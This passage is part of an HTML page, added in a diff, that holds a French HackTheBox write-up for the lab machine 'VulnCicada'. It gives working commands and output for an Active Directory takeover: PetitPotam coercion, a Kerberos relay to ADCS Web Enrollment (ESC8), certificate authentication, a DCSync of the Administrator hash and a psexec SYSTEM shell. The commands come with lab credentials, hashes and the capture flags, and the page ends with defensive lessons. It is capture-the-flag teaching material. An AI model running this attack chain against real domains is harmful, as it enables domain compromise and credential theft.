+<span class="error">[!] Vulnerabilities
+    ESC8 : Web Enrollment is enabled over HTTP.</span></pre>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-name">ESC8 — HTTP Web Enrollment</div>
+      <p class="vuln-desc">
+        ESC8 est une vulnérabilité ADCS où le Web Enrollment (interface HTTP permettant de demander des certificats) 
+        est accessible via HTTP non sécurisé. Cela permet à un attaquant de relayer une authentification interceptée 
+        vers ce endpoint et d'obtenir un certificat au nom de la victime — même un compte machine DC.
+      </p>
+    </div>
+
+    <p class="prose">On confirme également les méthodes de coercition disponibles :</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">netexec smb</span> <span class="domain">DC-JPQ225.cicada.vl</span> <span class="flag">-u</span> Rosie.Powell <span class="flag">-p</span> Cicada123 <span class="flag">-k -M coerce_plus</span>
+
+<span class="success">COERCE_PLUS  VULNERABLE, DFSCoerce
+COERCE_PLUS  VULNERABLE, PetitPotam
+COERCE_PLUS  VULNERABLE, PrinterBug
+COERCE_PLUS  VULNERABLE, MSEven</span></pre>
+    </div>
+  </section>
+
+  <!-- SECTION 5 : KERBEROS RELAY -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">05</span>
+      <h2 class="section-title">KERBEROS RELAY — ESC8</h2>
+      <span class="section-icon">⚡</span>
+    </div>
+
+    <div class="highlight-box danger">
+      <strong>Pourquoi Kerberos relay et pas NTLM relay ?</strong><br>
+      NTLM est complètement désactivé sur ce DC. Le self-relay NTLM est aussi bloqué nativement par Windows. 
+      On doit donc utiliser le <strong>Kerberos relay</strong> via <code>krbrelayx</code> — qui n'est pas soumis à ces restrictions.
+    </div>
+
+    <p class="prose">La technique repose sur un <strong>enregistrement DNS spécial</strong> dont le nom contient une structure <code>CREDENTIAL_TARGET_INFORMATION</code> sérialisée. Quand le DC voit ce nom, il génère automatiquement un ticket Kerberos pour son propre compte machine <code>DC-JPQ225$</code>.</p>
+
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-step">Étape 1 — DNS Record Magique</div>
+        <div class="timeline-desc">Ajouter un enregistrement DNS pointant vers notre machine avec un nom contenant la structure CREDENTIAL_TARGET_INFORMATION</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-step">Étape 2 — SPN via BloodyAD</div>
+        <div class="timeline-desc">Ajouter un SPN pour forcer le DC à générer un ticket Kerberos pour son compte machine</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-step">Étape 3 — Lancer Krbrelayx</div>
+        <div class="timeline-desc">Écouter sur le port 445 et relayer automatiquement les tickets Kerberos reçus vers ADCS HTTP</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-step">Étape 4 — Coercition PetitPotam</div>
+        <div class="timeline-desc">Forcer le DC à se connecter vers notre enregistrement DNS malveillant</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-step">Résultat — Certificat DC-JPQ225$</div>
+        <div class="timeline-desc">ADCS émet un certificat valide pour le compte machine du DC</div>
+      </div>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash — Étape 1 : DNS Record</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">bloodyAD</span> <span class="flag">-u</span> Rosie.Powell <span class="flag">-p</span> Cicada123 <span class="flag">-d</span> cicada.vl <span class="flag">-k</span> \
+  <span class="flag">--host</span> <span class="domain">DC-JPQ225.cicada.vl</span> add dnsRecord \
+  DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA \
+  <span class="ip">10.10.14.252</span>
+<span class="success">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash — Étape 2 : SPN</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">bloodyAD</span> <span class="flag">-u</span> Rosie.Powell <span class="flag">-p</span> Cicada123 <span class="flag">-d</span> cicada.vl <span class="flag">-k</span> \
+  <span class="flag">--host</span> <span class="domain">DC-JPQ225.cicada.vl</span> set object DC-JPQ225$ \
+  servicePrincipalName <span class="flag">-v</span> <span class="success">"cifs/DC-JPQ225a.cicada.vl"</span>
+<span class="success">[+] Attribute servicePrincipalName successfully updated</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash — Étape 3 : Krbrelayx [TERMINAL 1]</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="comment"># Cloner krbrelayx</span>
+<span class="cmd">git clone</span> https://github.com/dirkjanm/krbrelayx.git /tmp/krbrelayx
+<span class="cmd">cd</span> /tmp/krbrelayx
+
+<span class="comment"># Lancer le relay vers ADCS</span>
+<span class="cmd">sudo python3 krbrelayx.py</span> \
+  <span class="flag">--target</span> http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp \
+  <span class="flag">--adcs --template</span> DomainController
+
+<span class="output">[*] Running in kerberos relay mode
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+[*] Servers started, waiting for connections</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash — Étape 4 : Coercition PetitPotam [TERMINAL 2]</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">netexec smb</span> <span class="domain">DC-JPQ225.cicada.vl</span> <span class="flag">-u</span> Rosie.Powell <span class="flag">-p</span> Cicada123 <span class="flag">-k</span> \
+  <span class="flag">-M coerce_plus</span> \
+  <span class="flag">-o</span> LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA \
+  METHOD=PetitPotam
+
+<span class="success">COERCE_PLUS  VULNERABLE, PetitPotam
+COERCE_PLUS  Exploit Success, efsrpc\EfsRpcAddUsersToFile</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">output — Résultat dans Krbrelayx</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="output">[*] SMBD: Received connection from 10.129.234.48
+[*] HTTP server returned status code 200, treating as a successful login
+[*] Generating CSR...
+[*] CSR generated!</span>
+<span class="success">[*] GOT CERTIFICATE! ID 89
+[*] Writing PKCS#12 certificate to ./unknown1181.pfx
+[*] Certificate successfully written to file</span></pre>
+    </div>
+
+    <div class="highlight-box">
+      🎯 <strong>Succès !</strong> On obtient un certificat PKCS#12 valide pour le compte machine <code>DC-JPQ225$</code>.
+    </div>
+  </section>
+
+  <!-- SECTION 6 : CERT AUTH -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">06</span>
+      <h2 class="section-title">AUTHENTIFICATION AVEC LE CERTIFICAT</h2>
+      <span class="section-icon">🎫</span>
+    </div>
+
+    <p class="prose">On utilise le certificat obtenu pour s'authentifier en tant que <code>DC-JPQ225$</code> et récupérer un TGT Kerberos ainsi que le hash NTLM du compte machine.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">certipy auth</span> <span class="flag">-pfx</span> /tmp/krbrelayx/unknown1181.pfx <span class="flag">-dc-ip</span> <span class="ip">10.129.234.48</span>
+
+<span class="output">[*] Certificate identities:
+[*]   SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
+[*]   Security Extension SID: 'S-1-5-21-...-1000'
+[*] Using principal: 'dc-jpq225$@cicada.vl'
+[*] Trying to get TGT...</span>
+<span class="success">[*] Got TGT
+[*] Saving credential cache to 'dc-jpq225.ccache'</span>
+<span class="output">[*] Trying to retrieve NT hash for 'dc-jpq225$'</span>
+<span class="hash">[*] Got hash for 'dc-jpq225$@cicada.vl':
+    aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3</span></pre>
+    </div>
+  </section>
+
+  <!-- SECTION 7 : DCSYNC -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">07</span>
+      <h2 class="section-title">DCSYNC — HASH ADMINISTRATOR</h2>
+      <span class="section-icon">💀</span>
+    </div>
+
+    <p class="prose">Le compte machine <code>DC-JPQ225$</code> possède les droits de réplication de l'annuaire (DCSync). On utilise le TGT récupéré pour extraire le hash NTLM de l'Administrator via <code>secretsdump</code>.</p>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="cmd">KRB5CCNAME</span>=dc-jpq225.ccache <span class="cmd">impacket-secretsdump</span> \
+  <span class="flag">-k -no-pass</span> cicada.vl/dc-jpq225\$@<span class="domain">DC-JPQ225.cicada.vl</span> \
+  <span class="flag">-just-dc-user</span> administrator
+
+<span class="output">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>
+<span class="hash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::</span>
+<span class="output">[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a</span></pre>
+    </div>
+
+    <div style="text-align:center; margin: 1.5rem 0;">
+      <div class="cred-box">
+        <span style="font-size:10px;color:var(--text-dim);letter-spacing:2px;">ADMINISTRATOR NTLM HASH</span>
+        <span class="cred-pass">85a0da53871a9d56b6cd05deda3a5e87</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 8 : SHELL -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">08</span>
+      <h2 class="section-title">SHELL SYSTEM — FLAGS</h2>
+      <span class="section-icon">🏆</span>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">bash</span>
+        <div class="code-dots"><div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div></div>
+      </div>
+      <pre><span class="comment"># Obtenir un TGT Administrator</span>
+<span class="cmd">impacket-getTGT</span> cicada.vl/administrator \
+  <span class="flag">-hashes</span> :85a0da53871a9d56b6cd05deda3a5e87 \
+  <span class="flag">-dc-ip</span> <span class="ip">10.129.234.48</span>
+
+<span class="comment"># Shell via psexec avec Kerberos</span>
+<span class="cmd">KRB5CCNAME</span>=administrator.ccache <span class="cmd">impacket-psexec</span> \
+  <span class="flag">-k -no-pass</span> cicada.vl/administrator@<span class="domain">DC-JPQ225.cicada.vl</span>
+
+<span class="success">C:\Windows\system32> whoami
+nt authority\system</span>
+
+<span class="comment"># Lecture des flags</span>
+<span class="success">C:\Users\Administrator\Desktop> type user.txt</span>
+<span class="hash">2f0619d35bd78d52f1c528e0bee922a9</span>
+
+<span class="success">C:\Users\Administrator\Desktop> type root.txt</span>
+<span class="hash">72fef7fd0b995c7864ac1b1568095718</span></pre>
+    </div>
+
+    <div class="flags-section">
+      <div class="flag-card user">
+        <div class="flag-label">🔵 User Flag</div>
+        <div class="flag-value">2f0619d35bd78d52f1c528e0bee922a9</div>
+        <div class="flag-path">C:\Users\Administrator\Desktop\user.txt</div>
+      </div>
+      <div class="flag-card root">
+        <div class="flag-label">🔴 Root Flag</div>
+        <div class="flag-value">72fef7fd0b995c7864ac1b1568095718</div>
+        <div class="flag-path">C:\Users\Administrator\Desktop\root.txt</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="divider">LESSONS LEARNED</div>
+
+  <!-- SECTION 9 : LESSONS -->
+  <section class="section">
+    <div class="section-header">
+      <span class="section-number">09</span>
+      <h2 class="section-title">CE QU'ON A APPRIS</h2>
+      <span class="section-icon">📚</span>
+    </div>
+
+    <div class="lessons">
+      <div class="lesson-card">
+        <div class="lesson-icon">📂</div>
+        <div class="lesson-title">NFS mal sécurisé</div>
+        <div class="lesson-text">Un partage NFS accessible à tous exposant les profils utilisateurs peut contenir des informations sensibles comme des mots de passe dans des fichiers ou images.</div>
+      </div>
+      <div class="lesson-card">
+        <div class="lesson-icon">📜</div>
+        <div class="lesson-title">ESC8 — Web Enrollment HTTP</div>
+        <div class="lesson-text">Le Web Enrollment ADCS sur HTTP permet le relayage d'authentification vers le serveur de certificats. Toujours désactiver HTTP et n'utiliser que HTTPS avec protection HTTPS binding.</div>
+      </div>
+      <div class="lesson-card">
+        <div class="lesson-icon">⚡</div>
+        <div class="lesson-title">Kerberos Relay</div>
+        <div class="lesson-text">Désactiver NTLM ne suffit pas à protéger contre le relay. Kerberos peut également être relayé dans certaines conditions, notamment via des enregistrements DNS contenant des structures CREDENTIAL_TARGET_INFORMATION.</div>
+      </div>
+      <div class="lesson-card">
+        <div class="lesson-icon">🔧</div>
+        <div class="lesson-title">Certipy v5 vs v4</div>
+        <div class="lesson-text">Certipy v5 contient un bug avec le Kerberos relay (identité vide). Il faut utiliser krbrelayx de dirkjanm ou certipy v4.8.2 dans un environnement Python 3.11.</div>
+      </div>
+      <div class="lesson-card">
+        <div class="lesson-icon">🎯</div>
+        <div class="lesson-title">DCSync via compte machine</div>
+        <div class="lesson-text">Le compte machine du DC possède les droits de réplication. Un certificat valide pour DC-JPQ225$ permet d'obtenir un TGT et d'effectuer un DCSync pour extraire tous les hashes du domaine.</div>
+      </div>
+      <div class="lesson-card">
+        <div class="lesson-icon">🕐</div>
+        <div class="lesson-title">Synchronisation Kerberos</div>
+        <div class="lesson-text">Kerberos exige une synchronisation d'horloge précise (±5 minutes). Sans ntpdate, toutes les authentifications échouent avec KRB_AP_ERR_SKEW.</div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  VulnCicada — HackTheBox Writeup &nbsp;|&nbsp; cicada.vl &nbsp;|&nbsp; ESC8 + Kerberos Relay &nbsp;|&nbsp; Domain Compromised ✓
+</footer>
+
+</body>
+</html>
